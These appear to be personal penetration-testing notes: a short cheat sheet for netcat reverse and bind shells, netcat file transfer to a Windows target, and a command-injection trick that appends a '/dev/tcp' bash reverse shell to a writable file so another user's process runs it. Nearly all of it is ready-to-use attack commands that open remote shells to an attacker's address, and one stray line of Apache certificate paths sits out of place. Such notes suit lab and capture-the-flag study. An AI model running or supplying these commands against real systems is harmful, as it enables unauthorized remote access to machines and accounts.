# Reverse shell
Connection from the target to the attacker
//opening port with netcat on my system
nc -nvlp 4444
//or -n skip dns name resolution & verbose
nc -n -v 10.11.0.22 110

//establishing connection on the victims system
nc 192.168.0.6 4444 -e /bin/bash

//just to open connection, and chat
nc -nv 10.11.0.22 4444


# Bind shell
Connection from the attacker to the target  
//opening port with netcat on the target 
nc -nvlp 4444

//establishing connection on my pc
nc 192.168.0.6 4444 -e /bin/bash

# Buffer overflow
Local bo is not intereseting check for remote bo

# transfer files to windows
//on target system and redirect any file to incoming.exe
nc -nlvp 4444 > incoming.exe

//locate file
locate wget.exe

// transfer file => we need to wait for file being uploaded
nc -nv 10.11.0.22 4444 < /user/share/.../wget.exe

//on target but first abort nc
incoming.exe -v


/etc/apache2/ssl/apache.crtSSLCertificateKeyFile /etc/apache2/ssl/apache.key

# reverse shell in programming languages
* example: you have access to user "kid" and on the users "yolo" home directory there is a writebale file (input not secured use: `echo “ ;/bin/bash -c ‘bash -i >& /dev/tcp/10.10.14.96/1234 0>&1’ #” >> hackers`
* You can add a script there with echo "the script" >> nameoffile to overwrite this file. The script points to your kali ip.
* set up a listener in kali
* Once the file got executed you will have reverse shell to "yolo"

# reverse shells

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
